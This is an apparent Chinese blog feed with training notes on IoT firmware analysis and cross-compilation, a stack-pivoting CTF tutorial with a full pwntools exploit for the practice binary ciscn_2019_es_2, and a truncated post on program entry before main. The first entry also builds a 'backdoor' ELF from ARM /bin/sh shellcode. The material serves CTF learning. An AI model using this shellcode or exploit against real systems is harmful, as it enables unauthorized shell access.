        <content type="html"><![CDATA[<h2 id="Day1"><a href="#Day1" class="headerlink" title="Day1"></a>Day1</h2><h3 id="IOT"><a href="#IOT" class="headerlink" title="IOT"></a>IOT</h3><p>IOT是一个完整的信息系统，它包括软件和硬件两个组成部分，也PC不同的是，他们主要的业务就是操控硬件设备，其实IOT在每个人眼中都有不同的看法，人云亦云，对于软件开发者来说，IOT是业务，是设备的的业务实现，对于网络安全从业者来说，就是硬件设备，它硬件上有我们可攻击的漏洞</p><p>那么一个完整的IOT设备它应该有云端，设备硬件端 ，APP端，三个切入点</p><p>通常我们都是从设备端或者是APP端来进行攻击，那么关注设备端就是关注这个设备从开始到启动的全过程，就是bios -&gt; bootloader -&gt; 操作系统 -&gt; init.d -&gt; 业务</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411916974.png" class=""><h3 id="固件"><a href="#固件" class="headerlink" title="固件"></a>固件</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>所谓”固件”，顾名思义，就是”固化在设备中的软件”，通常而言<strong>指的是 Flash 中被固化、执行固定功能的软件</strong>，需要注意的是固件是软件，是嵌入式设备中会被CPU所执行的代码</p><h4 id="固件的获取"><a href="#固件的获取" class="headerlink" title="固件的获取"></a>固件的获取</h4><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633411933096.png" class=""><h4 id="固件的解包"><a href="#固件的解包" class="headerlink" title="固件的解包"></a>固件的解包</h4><p>固件的解包一般有两种方法，binwalk和mount，binwalk在大多数情况下都管用，binwalk不管用的时候，mount可能会有奇效</p><p><strong>binwalk</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me *.bin <span class="comment">#递归提取</span></span><br><span class="line">binwalk -A *.bin <span class="comment">#识别架构</span></span><br><span class="line">binwalk -E *.bin <span class="comment">#熵值分析</span></span><br></pre></td></tr></table></figure><p><strong>mount</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir file_systems</span><br><span class="line">sudo mount ./rootfs.img file_systems</span><br></pre></td></tr></table></figure><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>逆向分析的思路都是通用的</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411945172.png" class=""><h6 id="分析攻击面"><a href="#分析攻击面" class="headerlink" title="分析攻击面"></a>分析攻击面</h6><p>输入就意味着存在着接口函数，既然有接口函数那就必然有实现的代码和相对应的硬件，但是需要注意的，我们分析IOT设备不是简单的read之类的输入，还包括很多物理世界的输入，比如USB口，网口等，这些输入都有可能成为一个IOT设备的攻击入口，所以多发散一下思维，没有什么是不可能的！</p><p>对于软件层面的分析，那分为两种情况，有shell和无shell，有shell，很好办了，查看一些它开启了哪些进程哪些服务，哪些端口，没有shell，就只能对它进行端口扫描了</p><h6 id="定位程序"><a href="#定位程序" class="headerlink" title="定位程序"></a>定位程序</h6><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633411966466.png" class=""><p>在前面我们通过收集IOT设备的信息后，我们就可以通过分析攻击的入口来定位，一般在查找的时候都是去查找厂商的二进制文件或者开源组件的漏洞</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>第一天的知识点还是比较基础的，从不同的角度阐述了IOT究竟是个什么玩意儿，它对于HWS来说有什么意义，对于不同的从业者来说又有什么意思，课程的后半部分就是在围绕着IOT中的一大基本要素——固件，所有的分析都是基于固件来分析的，所以说固件的提取和分析都是很关键的一环！拿到固件就像拿到IOT设备的蓝图，而后续的漏洞挖掘就是在探索地图当中那些神秘而又未知的宝藏！</p><h2 id="Day2"><a href="#Day2" class="headerlink" title="Day2"></a>Day2</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>流量分析中最重要的四个步骤”收，发，断，改”</p><p>收和发是流量中最基本的操作，在PWN中通过发送一些畸形的数据来使得程序的执行发生了一下非预期的结果，最终导致我们能够去做一些正常的操作所不能实现的东西</p><p>流量就像水流一样，流经哪里就可能会在某个地方留下一定的痕迹，如果我们在”水流”流动的过程中进行抓取，当然想要抓取更多更全面的信息，我们就得在”水流”的主干道上进行抓取，也就是在路由器干路侧放置抓包工具</p><p>所以当我们能够抓取到一些流量的时候，那必然可以进行断和改，就像我把”水流”中的水盛一碗上来，盛上来就是一个断的操作，接下来我在换一碗水再倒回去，便是改的操作</p><p>但是并不是所有的通信信道我们都可以去接入的，有一些信道是在内网当中的，我们不可能直接套用PWN的那一套，io.sendline()和io.recvuntil()，这不太可能做到，那就需要通过一下内网的边界进行介入，将外网的设备日穿，使得我们可以进入内网通信，这是一种外接内的情况，那还有一种内接外的情况，就是通过钓鱼邮件或者mqtt消息队列来进入内网通信，不多说，都是边界渗透的事</p><p>刚刚将的是现实生活中的抓，但我们不可能真的用手在空气中抓取通信报文，不太现实，所以一般我们都会通过树莓派刷上openwrt的代码，让树莓派变成一个小型的路由器，连接到干路进行抓取数据包</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633411985853.png" class=""><p>这里复现一下课上的实验——基于UDP信道的中间人攻击</p><p>先看看nc的参数</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633411997048.png" class=""><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-l<span class="comment">#监听模式，就是把nc当做一个server来看待，等待连接请求</span></span><br><span class="line">-p[port]<span class="comment">#端口号，可自定义</span></span><br><span class="line">-u<span class="comment">#使用UDP，默认是TCP</span></span><br><span class="line">-o[file]<span class="comment">#将传输过程中的数据以十六进制的形式保持到[file]中</span></span><br><span class="line">-s[addr]<span class="comment">#发送数据包的目的IP地址</span></span><br><span class="line">-w[time]<span class="comment">#设置超时的时间</span></span><br><span class="line">-z<span class="comment">#没有任何输入输出信息，用于扫描</span></span><br></pre></td></tr></table></figure><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>软件被运行在调试底座，也就是gdbserver并在上面暴露出调试接口给调试器，也就是gdb，我们通过gdb发送一些调试命令对软件进行调试</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412024242.png" class=""><p>既然要进行调试，那必然要暴露接口出来我们才可以进行调试，而这个接口也有很多种，UART，JTAG（Joint Test Action Group（联合测试行为组织，Coresight等等</p><h2 id="Day3"><a href="#Day3" class="headerlink" title="Day3"></a>Day3</h2><h3 id="交叉编译"><a href="#交叉编译" class="headerlink" title="交叉编译"></a>交叉编译</h3><p>交叉编译何为”交叉”？交叉就指的是不同的平台，就比如说我在<code>X86-64</code>平台下编译一个<code>ARM</code>架构的程序，就称之为交叉编译，与此对应的就是本地编译，可是为啥会有交叉编译这个概念呢？你本地编译不行吗？我还要再其他平台上编译，然后再送到你的平台上，费这么大劲干嘛？确实不行，由于嵌入式系统本身的原因，它所拥有的资源极其有限，它自己运行程序都够呛了，还给你编译，显然不太现实，所以才有了交叉编译</p><p>我们进行交叉编译的时候会用一个叫<code>arm-linux-gnueabi-gcc</code>，这包含了四个部分</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arch [-vendor] [-kernel] [-system] [-language]</span><br><span class="line"></span><br><span class="line">-arch <span class="comment">#架构，编译出来是用于那个平台</span></span><br><span class="line">-vendor <span class="comment">#工具链的提供厂商，由厂商定义</span></span><br><span class="line">-kernel <span class="comment">#目标的操作系统</span></span><br><span class="line">-system <span class="comment">#所用的库函数,其中gnu等价于glibc+oabi,gnueabi等价于glibc+eabi</span></span><br><span class="line">-language <span class="comment">#编译语言，可以是gcc和g++</span></span><br></pre></td></tr></table></figure><p> 看似这一个很高级的命令就可以编译出来程序，但是其本质还是gcc的那一套，某个编译的参数不同</p><p>而<code>gcc</code>本质是一个工具包，但是这个工具包不只是单纯的是一个个分散的工具，它里面的工具与工具之间会形成一个联系，也就是后面介绍的工具链，<code>gcc</code>就像一个老大，有很多小弟帮他做事情，在平时编译程序的时候我们只需要<code>gcc -o xxx xxx.c</code>，就完成了编译，看似简单的背后，<code>gcc</code>替我们做的事情却不简单，我们来看一下<code>gcc</code>编译程序的流程</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/1-1633412058794.png" class=""><p>编译的阶段一共分为四个阶段：</p><ul><li>预处理（Preprocess）</li><li>编译（Compile）</li><li>汇编（Assemble）</li><li>链接（Link）</li></ul><p>一个阶段一个阶段来看</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/2-1633412080757.png" class=""><h4 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -E hello.c -o hello.i</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/8-1633412103083.jpg" class=""><p>经过预处理之后，我们打开文件之后看到一些宏定义还有函数的定义，这时我们的文件大小也变的特别大，就是因为预处理把<code>include</code>的包全部解析进来了</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/4-1633412119601.png" class=""><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/3-1633412125461.png" class=""><h4 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h4><p>接下来就是编译，编译就是将它转化成汇编代码并进行优化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/5-1633412136616.png" class=""><h4 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h4><p>汇编器几乎是对着语句一句一句的进行转换，到这一步，我们的代码就已经形成了<code>ELF</code>文件的雏形，在汇编完成之后，这已经是一个<code>ELF</code>，但是拿去运行的时候并不能跑起来，从流程来看就是少了链接这个步骤，但这个步骤到底完成了什么呢？为什么没有它就不行呢？接下来慢慢介绍！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc -c hello.s -o hello.o</span><br></pre></td></tr></table></figure><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/6-1633412155310.png" class=""><h4 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h4><p>链接完成后就成为了一个可执行文件，那为什么要链接，程序员早期的代码都是写在一个文件当中的，但随着时间的迁移发现这样编写代码并不利于程序员管理代码，就演变出了各种文件来写不同的代码，所以当一个程序中需要用到其他程序中的函数的时候，链接就发挥了它的作用，它将此程序要用到的函数进行重定位，也就是做一个链接，让它能够顺利的调用这个函数，这就是链接~</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜ gcc hello.o -o hello</span><br></pre></td></tr></table></figure><p>看完编译的过程，我们回头看看每个过程的由那些程序来完成的，前两个步骤，也就是预处理和编译是由<code>GNU GCC</code>来完成的，后面两个汇编和链接是由<code>GUN Binutils</code>来完成的，<code>Binutils</code>是个啥？它有两个程序组成，一个是汇编（as），一个是链接（ld），前面我们也看到了预处理➜编译➜汇编➜链接，每个过程都是一环接一环的，所以才有了编译工具链的概念</p><p>讲到这就有个疑问了，<code>Binutils</code>是个啥？</p><p><code>Binutils</code>的全称是<code>GNU Binary Utilities</code>，<code>GNU</code>二进制工具集合，所谓二进制就是一些0和1的数字，回忆上面的过程，想到汇编过后是不是整个程序就完全变了样，用编辑器打开都是一些十六进制的数字，所以<code>Binutils</code>就是对二进制的目标进行操控的一个工具集合</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/7-1633412170352.png" class=""><p>在上面我们知道<code>Binutils</code>主要有两个特别重要的工具：</p><ul><li><p><code>as</code></p><p>汇编器，把汇编代码转换成相对于的机器码</p></li><li><p><code>ld</code></p><p>链接器，将目标文件进行链接，形成一个可执行文件</p></li></ul><p><code>Binutils</code>还有其他次要的工具，但你一定用过的工具</p><ul><li><p><code>readelf</code></p></li><li><p><code>objdump</code></p></li><li><p><code>strings</code></p></li><li><p><code>strip</code></p><p>看完<code>gcc</code>的编译过程，作为一位攻击者，很多时候我们编译的都不是一个嵌入式的二进制文件，而是<code>shellcode</code>，所以除了用<code>arm-linux-gnueabi-gcc</code>之类的交叉编译工具来编译一个程序，还可以使用<code>pwntools</code>的<code>make_elf</code>来生成一个<code>shellcode</code>后门</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;arm&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00&quot;</span></span><br><span class="line"></span><br><span class="line">backdoor  = make_elf(shellcode)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;backdoor&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(backdoor)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>运行上面的代码就得到了一个后门文件：</p><img src="/2021/10/05/2021HWS%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E5%A4%8F%E4%BB%A4%E8%90%A5/9-1633412183821.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> CTF培训 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/"/>
      <url>/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
      
        <content type="html"><![CDATA[<h4 id="0x00原理"><a href="#0x00原理" class="headerlink" title="0x00原理"></a>0x00原理</h4><p>当溢出的长度太小时，可以通过<code>leave_ret_gadget</code>来将<code>ebp</code>和<code>esp</code>迁移到我们想要的位置，比如：一个咱已经布置好<code>ROP</code>链的地方</p><p>假设在栈上布置如下的<code>ROP</code>链，我将通过图片来展示攻击效果</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131830383.png" class=""><p>布置好之后，每个程序就返回前都会恢复栈，就如下图的程序，所以我们就等待程序<code>leave ret</code>:</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131920731.png" class=""><p><code>leave</code>就是等价于上面说到的那段汇编代码，首先执行的是<code>mov esp,ebp</code>，这会让图中的0x108放入到<code>esp</code>中，我们的栈就会发生如下变化：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005131951134.png" class="" title="image-20211005131951134"><p>接着就是<code>pop ebp</code>，诶~，这时候我们的<code>ebp</code>就变成了我们想要迁移的位置了:</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132014543.png" class=""><p>我们在回顾一下栈上的情况，因为刚刚<code>pop ebp</code>，所以我们的<code>esp</code>指向了<code>leave_ret</code>这个<code>gadget</code>：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132035570.png" class=""><p>所以程序又执行了一次<code>leave</code>，我们迁移后的栈就会变成这样：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132117043.png" class=""><p>非常的神奇吼！我们的<code>esp</code>指向了<code>system</code>函数！也就是说我们已经成功的获取了<code>shell</code>！！！</p><blockquote><p>可能有读者要问了：啊？，你这<code>ebp</code>不是栈底寄存器吗？他怎么指向了一个奇怪的地方，你这不行啊？，对，此时的<code>ebp</code>已经指向了一个奇怪（后面的例题会展示奇怪的点）的地方，但是问题不大，我们只要明白<code>ebp</code>和<code>esp</code>最根本的作用是什么就不会觉得奇怪了，<code>ebp</code>的作用是来定位每个函数的栈的大小，当函数返回时才需要通过<code>ebp</code>来恢复主函数的栈，而<code>esp</code>才是真正控制栈的进出，所以我们只要控制<code>esp</code>指向我们想要指向的函数就可以达到我们的目的了，至于<code>ebp</code>嘛，我们都拿到<code>shell</code>了，它能不能成功的返回已经不关我事了嘿嘿嘿~</p></blockquote><h4 id="0x01-例题解析"><a href="#0x01-例题解析" class="headerlink" title="0x01 例题解析"></a>0x01 例题解析</h4><p>这里拿19年国赛的一道题(<code>ciscn_2019_es_2</code>)来讲解一下，经典入门题，在<code>buu</code>上，大伙可以去玩玩</p><p>习惯<code>checksec</code>一下：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132145614.png" class=""><p><code>main</code>函数看看：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132203888.png" class=""><p><code>vul</code>函数不用多说，肯定就是受害函数了，仔细一看，只能溢出8字节吼！也真够抠的，不过我们刚刚学了栈迁移，不慌</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132222944.png" class=""><p>我们一个个来看吼，首先程序<code>memset</code>了<code>s</code>这个数组，但是很奇怪，它初始化又不全部清零，就整了0x20个字节，它为啥要这么做呢，其实就是在泄露信息，如果它没全部清零，那后0x10是什么东西呢？诶~，就是栈上的地址对吧，所以当我们覆盖了<code>s</code>数组最后的<code>&quot;\n&quot;</code>，那<code>printf</code>打印s的时候，是不是就不会截断，是不是就打印了那未初始化的值，也就泄露了栈上的地址，有人可能又有疑问了，泄露栈上的地址有什么用呢？别急，慢慢来！</p><p>在第一次<code>read</code>（）的时候，我输入了24个<code>a</code>和我的<code>id</code>，计算一下s的位置到<code>ebp</code>的距离，拿起你的小计算器计算一下：<code>0xa8 - 0x80</code> 是不是等于0x28，至于为啥要到<code>ebp</code>呢，别问，问就是后面好定位偏移</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132246238.png" class=""><p>按照上面的想法我们写出下面的exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br></pre></td></tr></table></figure><p>前面我说过，我们栈迁移是迁移到另一个有我们ROP链的地方，但是这里我们并没有办法往其他地方写入我们的ROP链，我们只能往栈上写入，所以我有个大胆的想法，栈迁移到栈上，这样我们刚刚泄露的栈地址就有用了是不，所以我们在第二次read（）的时候就将栈布置成这样：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br></pre></td></tr></table></figure><p>咱动调看看：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132304965.png" class=""><p>leave之后：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132322783.png" class=""><p>注意<code>esp</code>和<code>ebp</code>，是不是<code>esp</code>比<code>ebp</code>还大哈哈哈:</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132336295.png" class=""><p>再往下执行，咱就发现<code>esp</code>指向了<code>system</code>的<code>plt</code>：</p><img src="/2021/10/05/%E6%A0%88%E8%BF%81%E7%A7%BB/image-20211005132348696.png" class=""><p>完整EXP：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_es_2&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;node3.buuoj.cn&#x27;,27587)</span></span><br><span class="line">sys_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x080484b8</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;your name?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x24</span></span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;zyen&#x27;</span>)</span><br><span class="line">ebp_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">io.success(<span class="string">&#x27;[*] ebp_addr: &#x27;</span> + <span class="built_in">hex</span>(ebp_addr))</span><br><span class="line">payload = <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload += p32(sys_addr)</span><br><span class="line">payload += <span class="string">&#x27;zyen&#x27;</span></span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x28</span>)</span><br><span class="line">payload += <span class="string">&#x27;/bin/sh\00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p32(ebp_addr-<span class="number">0x38</span>)</span><br><span class="line">payload += p32(leave_ret)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF小知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>main真的是函数入口吗？</title>
      <link href="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/"/>
      <url>/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<blockquote><p>​        在我们开始学习C语言的时候，老师就跟我们讲”main函数就是程序开始执行的地方”，所有的代码都是从这里开始的，可事实真的是这样的吗？</p></blockquote><p>“所有”？这个词似乎有点以偏概全，如果main函数就是一切的开始，那么程序的堆栈，main函数传递的参数，I/O操作是凭空出现的吗？显然不是，是操作系统在main函数之前，就已经帮我们初始化好了一切，所以我们的main函数才能顺利执行，那么入口点不是main，那会是谁呢？我们可以编译一个静态的demo并对main函数进行交叉引用一下，可以发现它的名字叫<code>start</code>，当我们跟进去的时候，就能发现另一个新的世界！</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;welcome to exit\n&quot;</span>);</span><br><span class="line">     <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc exit.c -o exit -no-pie -static</span></span><br></pre></td></tr></table></figure><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/1-1633405730636.png" class=""><p>在IDA里面可以看到<code>_start</code>的汇编，<code>_start</code>可以分为两个部分上半部分</p><p>上面的<code>_start</code>函数是<code>x86</code>下的（有做删减），下面的是<code>x86-64</code>，对比来看<code>x86</code>的就长了很多，原因是因为压栈的时候，不能直接将内存中的地址压入栈中，需要存到后寄存器再压入栈中，虽然长了点，但调用的本质都是一样的</p><ul><li><code>xor ebp,ebp</code>将<code>ebp</code>进行异或置为0完成对栈底指针的初始化，之后<code>pop esi</code>将<code>argc</code>弹出到<code>esi</code>中，因为再最开始初始化的时候就已经将<code>env,argv,argc</code>压入栈中，并且<code>esp</code>指向了<code>argc</code>的位置，之后就将<code>esp</code>进行异或<code>0FFFFFFF0h</code>，<code>esp</code>会根据当前的位置下降<code>0-15</code>个字节，为什么要这么做呢？目的是为了对齐，保证栈上所有的变量都能够被内存和<code>cache</code>快速的访问</li></ul><img src="/2021/10/05/main%E7%9C%9F%E7%9A%84%E6%98%AF%E5%87%BD%E6%95%B0%E5%85%A5%E5%8F%A3%E5%90%97%EF%BC%9F/2-1633405730636.png" class=""><blockquote><p><code>env</code>是系统的环境变量，包括系统的一些基本信息，所以<code>__environ</code>一直指向的一直都是栈上的地址，这就是为什么它能够泄露栈地址的原因，平时在路由器里面执行<code>printenv</code>的时候就能打印路由器的环境变量，这对于接下来的攻击也有很大的辅助作用</p></blockquote><ul><li><p>之后的语句就是压入<code>___libc_start_main</code>函数所需要的参数，为了字节对齐，压入的第一个参数<code>eax</code>只有对齐的效果，并没有使用到，下面的参数就是按照<code>__libc_start_main</code>的函数定义依次压入，<code>stack_end</code>是栈顶指针，<code>rtld_fini</code>动态加载有关的收尾工作，<code>init</code>为main调用前的初始化，<code>fini</code>为main函数结束之后的收尾工作 </p><p><code>__libc_start_main</code>在<code>libc-start.c</code>的文件里面，其函数定义如下</p></li></ul><blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 